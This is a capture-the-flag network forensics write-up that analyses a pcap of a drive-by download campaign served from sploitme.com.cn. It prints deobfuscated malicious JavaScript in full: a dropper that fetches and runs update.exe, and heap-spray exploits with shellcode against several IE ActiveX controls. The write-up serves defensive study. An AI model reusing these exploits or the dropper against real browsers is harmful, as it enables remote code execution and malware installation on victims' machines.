---
title: NukeTheBrowser
date: 2024-09-10 00:00:00 -500
categories: [CyberDefenders, DFIR, Network Forensics]
tags: [CyberDefenders]
---

# Instructions:

Uncompress the lab (pass: **cyberdefenders.org**), analyze the pcap and answer the questions.


# Scenario

A network trace with attack data is provided. Please note that the IP address of the victim has been changed to hide the true location.

As a soc analyst, analyze the artifacts and answer the questions.


### Tools:

```c
- [BrimSecurity](https://www.brimsecurity.com/)
- [WireShark](https://www.wireshark.org/)
- [SpiderMonkey](https://blog.didierstevens.com/programs/spidermonkey/)
	- Link to the youtube tutorial: 'youtube.com/watch?v=wDJR7110iaA'
	- Steven Didier has a great youtube channel : @dist67
- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [libemu](https://github.com/buffer/libemu)
- [Network Miner](https://www.netresec.com/?page=NetworkMiner)
- [MalZilla]("added later by me! I think this one is important too")[https://malzilla.org]
- [Jsunpack-n]("added later by me! I think this one is important too")[https://github.com/urule99/jsunpack-n]
```

.
# Tags:

```c
[PCAP](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=pcap)
[P0f](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=p0f)
[Wireshark](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=wireshark)
[NetworkMiner](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=networkminer)
[BRIM](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=brim)
[SpiderMonkey](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=spidermonkey)
[VirusTotal](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=virustotal)
[JavaScript](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=javascript)
[CVEs](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=cves)
[T1071.001](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=t1071.001
[T1140](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=t1140
[T1059.003](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=t1059.003)
[T1204](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=t1204)
[T1189](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=t1189)
```


## Node Context:

`->` Tool used for this: ***NetworkMiner***

First Router/WAP : `10.0.2.2`
![](/assets/img/Pasted image 20240808235953.png)


Host `10.0.2.15` in this network:
![](/assets/img/Pasted image 20240809000122.png)

	- Host has a Windows OS
	- Host connected to rapidshare.com.eyu32.ru and then to sploitme.com.cn


Second Router/WAP: `10.0.3.2`
![](/assets/img/Pasted image 20240809000430.png)


Host `10.0.3.15` in this network:
![](/assets/img/Pasted image 20240809000546.png)


Third router/WAP: `10.0.4.2`
![](/assets/img/Pasted image 20240809000658.png)


Host `10.0.4.15` in this network:
![](/assets/img/Pasted image 20240809000728.png)


Fourth router/WAP:
![](/assets/img/Pasted image 20240809000815.png)


Host `10.0.5.15` in this network:
![](/assets/img/Pasted image 20240809000917.png)


Users `10.0.3.15`, and `10.0.4.15` interacting with the honeypot:
![](/assets/img/Pasted image 20240809001030.png)


Gateway for the malicious website:
![](/assets/img/Pasted image 20240809001150.png)


Malicious website used for watering hole attacks: `192.168.56.50`
![](/assets/img/Pasted image 20240809001434.png)

	- Hostname: rapidshare.com.eyu32.ru
	- Uses Javascript to force unaware users to download and execute malware on their host machines. (Clickjacking)


Actual malware website used for dissemination:
![](/assets/img/Pasted image 20240809001600.png)


Website for the honeypot:
![](/assets/img/Pasted image 20240809001729.png)


Google servers used for redirection:
![](/assets/img/Pasted image 20240809002006.png)



## Network Context:

<u>Protocols</u>:
![](/assets/img/Pasted image 20240807155051.png)

```c
IPv4
	- NetBIOS
	- SMB
	- DHCP
	- DNS

TCP
	- VSS Monitoring Ethernet Trailer
	- HTTP
	- IGMP
	- ICMP

ARP
```


<u>Communicating endpoints</u>:

###### Ethernet:
![](/assets/img/Pasted image 20240807155310.png)


###### IPv4:
![](/assets/img/Pasted image 20240807155224.png)


###### TCP:
![](/assets/img/Pasted image 20240807155333.png)


###### UDP:
![](/assets/img/Pasted image 20240807155401.png)



# Questions:

## `Q1` Multiple systems were targeted. Provide the IP address of the highest one.

<u>Presumed attackers</u>:
```c
- 10.0.2.15
- 10.0.3.15
- 10.0.4.15
- 10.0.5.15
```

	- This is a botnet. You'll see why later on.


-> Answer: `10.0.5.15`

## `Q2` What protocol do you think the attack was carried over?

- It used port 80 so it maybe HTTP.

![](/assets/img/Pasted image 20240807161410.png)

Following the `HTTP` stream:
![](/assets/img/Pasted image 20240807161600.png)

-> Answer: `http`


## `Q3` What was the URL for the page used to serve malicious executables (don't include URL parameters)?

Checking all websites requested in the `pcap`:
![](/assets/img/Pasted image 20240807162334.png)
![](/assets/img/Pasted image 20240807162349.png)


Websites that are more likely to be a malware site:
```c
- sploitme.com.cn
- rapidshare[.]com[.]eyu32[.]ru
```


<u>Downloaded files captured</u>:
![](/assets/img/Pasted image 20240807162630.png)


Finding packet streams for `sploitme` website: Instance that the malware is being downloaded
![](/assets/img/Pasted image 20240807163448.png)


Other files on `Export Object`:
![](/assets/img/Pasted image 20240807170916.png)

-> Answer: `http://sploitme.com.cn/fg/load.php`


## `Q4` What is the number of the packet that includes a redirect to the french version of Google and probably is an indicator for Geo-based targeting?

DNS request to the french version of google:
![](/assets/img/Pasted image 20240807165649.png)


Redirected request:
![](/assets/img/Pasted image 20240807170538.png)

	- Once the compromised system figured out that the google IP wasn't a French-based, it cancels the connection and acquire the IP for google.fr next.


Normal request to the french version of google:
![](/assets/img/Pasted image 20240807165855.png)

	- Notice in here that the compromised system 10.0.3.15 tried to connect to 209.85.227.99 and it was successful.
	- This malware only targets france-based system.

-> Answer: `299`

## `Q5` What was the CMS used to generate the page '`shop.honeynet.sg/catalog/`'? (Three words, space in between)

Checking all types of connections:
![](/assets/img/Pasted image 20240808225909.png)

	- Could not find anything


Wireshark query:
```c
http.response.code == 200
```

	- This will return the HTML page


![](/assets/img/Pasted image 20240808231557.png)

- The `banner` should be an indicator of what the `Content Management System (CMS)` is:
```c
oscommerce -> good keyword!
```

- Looking it up at Google:
```c
osCommerce banner cms
```

- Inside their site `www.oscommerce.com`, on the left hand side, go to the `Main Page` then search up `version`.
- Go to `Old Versions`.
- You'll see the full name of the CMS: `osCommerce Online Merchant`

-> Answer: `osCommerce Online Merchant`


## `Q6` What is the number of the packet that indicates that '`show.php`' will not try to infect the same host twice?

Search up the keyword:
![](/assets/img/Pasted image 20240807182309.png)

	- Nope, that's not it.


***Note***: Prior to this, we know that machines gets infected from downloading malware from `sploit.com.cn` after logging in from `rapidshare.eye32.ru`.

![](/assets/img/Pasted image 20240808232603.png)

Victim machine clicked on something inside the website:
![](/assets/img/Pasted image 20240808233152.png)


First, let's narrow it down to the packets that shows the infection on the machine:
![](/assets/img/Pasted image 20240808232809.png)

Following the stream:
![](/assets/img/Pasted image 20240808232850.png)

	- Started when the user clicked something in the website causing to execute a Javascript code.

![](/assets/img/Pasted image 20240808232944.png)

	- There's an encoded javascript which is most likely for downloading the malware on the victim machine by forcing it to have a GET request to /fg/load.php?e=1

![](/assets/img/Pasted image 20240808233017.png)

- Notice in this one, it uses Internet Explorer on the infected host and then downloads the malware.
![](/assets/img/Pasted image 20240807182244.png)


Now, let's check the packets/stream to which it doesn't reinfect the same machine:
![](/assets/img/Pasted image 20240808232246.png)

Following the stream for this request URI:
![](/assets/img/Pasted image 20240808232318.png)


Here's the specific packet for it:
![](/assets/img/Pasted image 20240809093256.png)

	- This one does not have the javascript shellcode to be sent to the victim's machine.

-> Answer: `366`


## `Q7` One of the exploits being served targets a vulnerability in "`msdds.dll`". Provide the corresponding CVE number.

##### Tools used for this question:
```c
- Wireshark
- Spidermonkey
```


Wireshark Query for isolating the packets for the malware distribution:
```c
http.request.uri contains "/fg/load.php"
```

Output 1:
![](/assets/img/Pasted image 20240809125710.png)

Another wireshark query:
```c
http.request.uri contains "/fg/show"
```

Output 2:
![](/assets/img/Pasted image 20240809125658.png)

**Note**: For the output on both wireshark queries that includes malicious javascript, document and deobfuscate all of the malicious javascript found.


Going to NetworkMiner to extract the Javascript clicked by users when they got infected:
![](/assets/img/Pasted image 20240809094320.png)

	- We want to find the packets related to this clicks since this is related to the Javascript code we're trying to find.


###### From packet `178`:
Packets for the first Javascript:
![](/assets/img/Pasted image 20240809094533.png)

Here's the stream for `/fg/show.php?s=3feb5a6b2f`:
![](/assets/img/Pasted image 20240809094630.png)

	- I highlighted the javascript we can use Spidermonkey with and saved it on notepad++


Another stream for `/fg/show.php?s=84c090bd86`:
![](/assets/img/Pasted image 20240809112041.png)

![](/assets/img/Pasted image 20240809112058.png)


- ***What we want is to analyze the obfuscated Javascript code and how we can relate it to `msdds.dll`!***
-> Link for documentation: `blog.didierstevens.com/2018/04/19/update-patched-spidermonkey/`

Important flags to remember:
```c
'a' : ASCII/HEX dump
'x' : HEX dump
'd' : raw dump
'D' : pure ASCII
'A' : pure ASCII/HEX dump
'x' : pure HEX dump
'd' : pure raw dump
'f' : file dump
```


How to use them:
```c
C:\Demo>js-ascii.exe
js> eval(unescape('%<hex1>%<hex2>%<hex3>%<hex-n>'));
```

	- Uses the default


How to use with the flag:
```c
C:\Demo>js-ascii.exe
js> document.output('x'); // flag used just before JavaScript evaluation
js> eval(unescape('%<hex1>%<hex2>%<hex3>%<hex-n>'));


<outputs as hex dump>
```


Isolating the malicious `javascript` code from Wireshark to Notepad++:
![](/assets/img/Pasted image 20240809124241.png)

Example command:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode1.js | js-ascii.exe -
```

	- What this does it pipes in the javascript code into js-ascii.exe instead of using 'document.write()' and placing the javascript inside the parenthesis.


Output:
![](/assets/img/Pasted image 20240809130128.png)

A more readable format:
![](/assets/img/Pasted image 20240809130217.png)

	- Doesn't have a malicious JavaScript code.

Since most malicious files are in a zip file (presumed good practice), we can use something like `zipdump.py` tool from Steven Didier's toolsuite to dump the malicious Javascript file:
```c
C:\Demo>zipdump.py -d demo.js.zip
<obfuscated-javascript-code-should-be-here>


C:\Demo>zipdump.py -d demo.js.zip | js-ascii.exe -
<deobfuscated-js-code-should-be-here>
```


Another way to execute `Spidermonkey` and modifying its output as stated above to either hex dump or ascii (or both!), is by doing this:
```c
C:\Demo>type jscode1.js | js-ascii.exe -e "document.output('a')" -
```


###### From packet `174`:
Command:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode2.js | js-ascii.exe -
```

Output in cmd terminal:
![](/assets/img/Pasted image 20240809130810.png)

Modifying the output type:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode2.js | js-ascii.exe -e "document.output('D')" -
```

Output:
![](/assets/img/Pasted image 20240809131726.png)

JavaScript code:
```c
function Complete(){setTimeout('location.href = "about:blank',2000);}

function CheckIP(){var req=null;try{req=new ActiveXObject("Msxml2.XMLHTTP");}catch(e){try{req=new ActiveXObject("Microsoft.XMLHTTP");}catch(e){try{req=new XMLHttpRequest();}catch(e){}}}
	if(req==null)return"0";req.open("GET","/fg/show.php?get_ajax=1&r="+Math.random(),false);req.send(null);if(req.responseText=="1"){return true;}else{return false;}}
	var urltofile='http://sploitme.com.cn/fg/load.php?e=1';var filename='update.exe';function CreateO(o,n){var r=null;try{r=o.CreateObject(n)}catch(e){}
	if(!r){try{r=o.CreateObject(n,'')}catch(e){}}
	if(!r){try{r=o.CreateObject(n,'','')}catch(e){}}
	if(!r){try{r=o.GetObject('',n)}catch(e){}}
	if(!r){try{r=o.GetObject(n,'')}catch(e){}}
	if(!r){try{r=o.GetObject(n)}catch(e){}}
return r;}

	function Go(a){var s=CreateO(a,'WScript.Shell');var o=CreateO(a,'ADODB.Stream');var e=s.Environment('Process');var xhr=null;var bin=e.Item('TEMP')+'\\'+filename;try{xhr=new XMLHttpRequest();}
	catch(e){try{xhr=new ActiveXObject('Microsoft.XMLHTTP');}
	catch(e){xhr=new ActiveXObject('MSXML2.ServerXMLHTTP');}}
	if(!xhr)return(0);xhr.open('GET',urltofile,false)
	xhr.send(null);var filecontent=xhr.responseBody;o.Type=1;o.Mode=3;o.Open();o.Write(filecontent);o.SaveToFile(bin,2);s.Run(bin,0);
}

function mdac(){var i=0;var objects=new Array('{BD96C556-65A3-11D0-983A-00C04FC29E36}','{BD96C556-65A3-11D0-983A-00C04FC29E36}','{AB9BCEDD-EC7E-47E1-9322-D4A210617116}','{0006F033-0000-0000-C000-000000000046}','{0006F03A-0000-0000-C000-000000000046}','{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}','{6414512B-B978-451D-A0D8-FCFDF33E833C}','{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}','{06723E09-F4C2-43c8-8358-09FCD1DB0766}','{639F725F-1B2D-4831-A9FD-874847682010}','{BA018599-1DB3-44f9-83B4-461454C84BF8}','{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}','{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);while(objects[i]){var a=null;if(objects[i].substring(0,1)=='{'){a=document.createElement('object');a.setAttribute('classid','clsid:'+objects[i].substring(1,objects[i].length-1));}else{try{a=new ActiveXObject(objects[i]);}catch(e){}}
if(a){try{var b=CreateO(a,'WScript.Shell');if(b){if(Go(a)){if(CheckIP()){Complete();}else{Complete();}
return true;}}}catch(e){}}
i++;}
Complete();}
mdac();
```


<u>Code breakdown</u>:
```c

```


<u>Functions found</u>:
```c
- Complete()
- CheckIP()
- Go()
- mdac()
```


###### From packet `502`:  URI request -> `/fg/load.php?e=1`
![](/assets/img/Pasted image 20240809132057.png)

Following the HTTP stream:
![](/assets/img/Pasted image 20240809132123.png)

Isolating the malicious javascript code found in the stream:
![](/assets/img/Pasted image 20240809132029.png)

Command:
```c
C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode3.js | js-ascii.exe -e "document.output('D')" -
```

Output:
![](/assets/img/Pasted image 20240809132500.png)

JavaScript code:
```c
function Complete(){
	setTimeout('location.href = "about:blank',2000);
}

function CheckIP(){
	var req=null;
	try{
		req=new ActiveXObject("Msxml2.XMLHTTP");
	} catch(e) {
		try{req=new ActiveXObject("Microsoft.XMLHTTP");
	} catch(e) {
		try { 
			req=new XMLHttpRequest();
		} catch(e){}
	}}
	if(req==null)
		return "0";
	req.open("GET","/fg/show.php?get_ajax=1&r="+Math.random(),false);
	req.send(null);
	if(req.responseText=="1"){
		return true;
	} else {
		return false;
	}}
	var urltofile='http://sploitme.com.cn/fg/load.php?e=1';
	var filename='update.exe';
	
function CreateO(o,n){
	var r=null;try{r=o.CreateObject(n)}catch(e){}
	if(!r){try{r=o.CreateObject(n,'')}catch(e){}}
	if(!r){try{r=o.CreateObject(n,'','')}catch(e){}}
	if(!r){try{r=o.GetObject('',n)}catch(e){}}
	if(!r){try{r=o.GetObject(n,'')}catch(e){}}
	if(!r){try{r=o.GetObject(n)}catch(e){}}
	return r;
}

function Go(a){
	var s=CreateO(a,'WScript.Shell');
	var o=CreateO(a,'ADODB.Stream');
	var e=s.Environment('Process');
	var xhr=null;
	var bin=e.Item('TEMP')+'\\'+filename;
	
	try{xhr=new XMLHttpRequest();}
	
	catch(e){try{xhr=new ActiveXObject('Microsoft.XMLHTTP');}
	catch(e){xhr=new ActiveXObject('MSXML2.ServerXMLHTTP');}}
	
	if(!xhr)return(0);
	xhr.open('GET',urltofile,false)
	xhr.send(null);
	var filecontent=xhr.responseBody;
	o.Type=1;o.Mode=3;
	o.Open();
	o.Write(filecontent);
	o.SaveToFile(bin,2);
	s.Run(bin,0);
}
	
function mdac(){
	var i=0;
	// These are list of DLLs
	var objects=new Array('{BD96C556-65A3-11D0-983A-00C04FC29E36}',
							'{BD96C556-65A3-11D0-983A-00C04FC29E36}',
							'{AB9BCEDD-EC7E-47E1-9322-D4A210617116}',
							'{0006F033-0000-0000-C000-000000000046}',
							'{0006F03A-0000-0000-C000-000000000046}',
							'{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}',
							'{6414512B-B978-451D-A0D8-FCFDF33E833C}',
							'{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}',
							'{06723E09-F4C2-43c8-8358-09FCD1DB0766}',
							'{639F725F-1B2D-4831-A9FD-874847682010}',
							'{BA018599-1DB3-44f9-83B4-461454C84BF8}',
							'{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}',
							'{E8CCCDDF-CA28-496b-B050-6C07C962476B}',
							null);
	while(objects[i]){
		var a=null;
		if(objects[i].substring(0,1)=='{'){
			a=document.createElement('object');
			a.setAttribute('classid','clsid:'+objects[i].substring(1,objects[i].length-1));
		} else {
			try {
				a=new ActiveXObject(objects[i]);
			} catch(e) {}
	}
	
	if(a){
		try{
			var b=CreateO(a,'WScript.Shell');
			if(b){
				if(Go(a)){
					if(CheckIP()){
						Complete();
					} else {
						aolwinamp();
					}
					return true;
				}
			}
		} catch(e){}
	}
	i++;}
	aolwinamp();
}

// Link for the Exploit: packetstormsecurity.com/files/77631/AOL-IWinAmpActiveX-Class-ConvertFile-Buffer-Overflow.html
function aolwinamp(){
	try{
		var obj=document.createElement('object');
		document.body.appendChild(obj);
		obj.id='IWinAmpActiveX';
		obj.width='1';
		obj.height='1';
		obj.data='./directshow.php';
		obj.classid='clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';
		
		var shellcode=unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u333D");
		
		var bigblock=unescape("%u0c0c%u0c0c");
		var headersize=20;
		var slackspace=headersize+shellcode.length;
		
		while(bigblock.length<slackspace)
			bigblock+=bigblock;
		var fillblock=bigblock.substring(0,slackspace);
		var block=bigblock.substring(0,bigblock.length-slackspace);
		
		while(block.length+slackspace<0x40000)
			block=block+block+fillblock;var memory=new Array();
		
		for(var i=0;i<666;i++){
			memory[i]=block+shellcode;
		}
		document.write('<SCRIPT language="VBScript">');
		document.write('bof=string(1400,unescape("%ff")) + string(1000,unescape("%0c"))');
		document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
		document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
		document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
		document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
		document.write('</SCRIPT>');
		} catch(e){}
	directshow();
}

function directshow(){
	var shellcode=unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u343D");
	
	var bigblock=unescape("%u9090%u9090");
	var headersize=20;
	var slackspace=headersize+shellcode.length;
	while(bigblock.length<slackspace)
		bigblock+=bigblock;
	
	var fillblock=bigblock.substring(0,slackspace);
	var block=bigblock.substring(0,bigblock.length-slackspace);
	
	while(block.length+slackspace<0x40000){
		block=block+block+fillblock;
	}
	
	var memory=new Array();for(var i=0;i<350;i++){memory[i]=block+shellcode;}

	try{
		var obj=document.createElement('object');
		document.body.appendChild(obj);
		obj.width='1';obj.height='1';
		obj.data='./directshow.php';
		obj.classid='clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';
		setTimeout("if (CheckIP()){ Complete(); } else { snapshot(); }",1000);
	} catch(e){ snapshot(); }
}

function snapshot(){
	var x;
	var obj;
	var mycars=new Array();
	
	mycars[0]='c:/Program Files/Outlook Express/wab.exe';
	mycars[1]='d:/Program Files/Outlook Express/wab.exe';
	mycars[2]='e:/Program Files/Outlook Express/wab.exe';
	
	try{
		var obj=new ActiveXObject('snpvw.Snapshot Viewer Control.1');
	} catch(e) { 
		try{var obj=document.createElement('object');
		obj.setAttribute('classid','clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9');
		obj.setAttribute('id','obj');
		obj.setAttribute('width','1');
		obj.setAttribute('height','1');
		document.body.appendChild(obj);
	}catch(e){}}

	try{
		if(obj='[object]'){
			for(x in mycars){
				obj=new ActiveXObject('snpvw.Snapshot Viewer Control.1');
				var buf=mycars[x];
				obj.Zoom=0;
				obj.ShowNavigationButtons=false;
				obj.AllowContextMenu=false;
				obj.SnapshotPath='http://sploitme.com.cn/fg/load.php?e=6';
				try{
					obj.CompressedPath=buf;obj.PrintSnapshot();
				var snpelement=document.createElement('iframe');
				snpelement.setAttribute('id','snapiframe');
				snpelement.setAttribute('src','about:blank');
				snpelement.setAttribute('width',1);
				snpelement.setAttribute('height',1);
				snpelement.setAttribute('style','display:none;');
				document.body.appendChild(snpelement);
				setTimeout("document.getElementById('snapiframe').src = 'ldap://';",3000);
	}catch(e){}}}}catch(e){}
	com();
}

function com(){
	try{
		var obj=document.createElement('object');
		document.body.appendChild(obj);
		obj.setAttribute('classid','clsid:EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F');
		if(obj){
			var shcode=unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u373D");
			
			var hbs=0x100000;
			var sss=hbs-(shcode.length*2+0x38);
			var hb=(0x0c0c0c0c-hbs)/hbs;
			var myvar=unescape("%u0C0C%u0C0C");
			var ss=myvar;
			while(ss.length*2<sss){
				ss+=ss;
			}
		ss=ss.substring(0,sss/2);
		var m=new Array();
		for(var i=0;i<hb;i++){
			m[i]=ss+shcode;
		}
		var z=Math.ceil(0x0c0c0c0c);
		z=document.scripts[0].createControlRange().length;
		}
	}catch(e){}
	spreadsheet();
}

function spreadsheet(){
	try{
		var objspread=new ActiveXObject('OWC10.Spreadsheet');
	} catch(e) {}
	
	if(objspread){
		try{
			var shellcode=unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u383D");
			
			var array=new Array();
			var ls=0x81000-(shellcode.length*2);
			var bigblock=unescape("%u0b0c%u0b0C");
			
			while(bigblock.length<ls/2){
				bigblock+=bigblock;
			}
			
			var lh=bigblock.substring(0,ls/2);
			delete bigblock;
			
			for(var i=0;i<0x99*2;i++){
				array[i]=lh+lh+shellcode;
			}
			
			CollectGarbage();
			
			var objspread=new ActiveXObject("OWC10.Spreadsheet");
			e=new Array();e.push(1);e.push(2);
			e.push(0);
			e.push(window);
			
			for(i=0;i<e.length;i++){
				for(j=0;j<10;j++){
					try{
						objspread.Evaluate(e[i]);
					}catch(e){}
				}
			}
			window.status=e[3]+"";
			for(j=0;j<10;j++){
				try{
					objspread.msDataSourceObject(e[3]);
				} catch(e){} 
			}
		} catch(e){}
	}
	Complete();
}
mdac();
```


<u>Code breakdown</u>:
```c

```


<u>Functions Found</u>:
```c
- Complete()
- CreateO
- CheckIP()
- Go()
- mdac()
- aolwinamp()
- directshow()
- snapshot()
- com()
- spreadsheet()
```

	- This is the last stream that has with `/fg/load` that has malicious Javascript on.
	- This exploit downloads an additional 2nd stage malware and then executes it.


Packets for the 2nd stage malware downloaded with this exploit and 1st stager:
![](/assets/img/Pasted image 20240809161821.png)

##### Question: How can I know that one of the function in here is an exploit? (and could be connected to `msdds.dll`?)


### Finding other possible malicious JavaScript: Found one at `packet 314`
Wireshark query:
```c
- "<script>" string keyword // Packet Details -> Narrow & Wide -> String -> Uncheck 'Case sensitive' box
- From here, found the packet 314.
```

Following the stream:
![](/assets/img/Pasted image 20240809145615.png)

JavaScript Code saved at Notepad++:
![](/assets/img/Pasted image 20240809145854.png)


JavaScript code:
```c
<!doctype html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Google</title>
<script>
window.google={kEI:"mHdoS-C7Ms2a-Abs68j-CA",
				kEXPI:"17259,22766,23388,23456,23599",
				kCSI:{e:"17259,22766,23388,23456,23599",
						ei:"mHdoS-C7Ms2a-Abs68j-CA",
						expi:"17259,22766,23388,23456,23599"},
				kHL:"fr",
				time:function(){return(new Date).getTime()},
				log:function(b,d,c){
					var a=new Image,e=google,g=e.lc,f=e.li;
					a.onerror=(a.onload=(a.onabort=function(){delete g[f]}));
					g[f]=a;
					c=c||"/gen_204?atyp=i&ct="+b+"&cad="+d+"&zx="+google.time();
					a.src=c;
					e.li=f+1},
				lc:[],
				li:0,
				Toolbelt:{}
			};

window.google.sn="webhp";
window.google.timers={load:{t:{start:(new Date).getTime()}}};

try{
	window.google.pt=window.external&&window.external.pageT;
} catch(u){}

window.google.jsrt_kill=1;

var _gjwl=location;

function _gjuc(){
	var b=_gjwl.href.indexOf("#");
	if(b>=0){var a=_gjwl.href.substring(b+1);
	if(/(^|&)q=/.test(a)&&a.indexOf("#")==-1&&!/(^|&)cad=h($|&)/.test(a)){
		_gjwl.replace("/search?"+a.replace(/(^|&)fp=[^&]*/g,"")+"&cad=h");
		return 1}
	}
	return 0
}

function _gjp(){
	!(window._gjwl.hash&&window._gjuc())&&setTimeout(_gjp,500)
};

window._gjp && _gjp()
</script>

//This block can be ignored
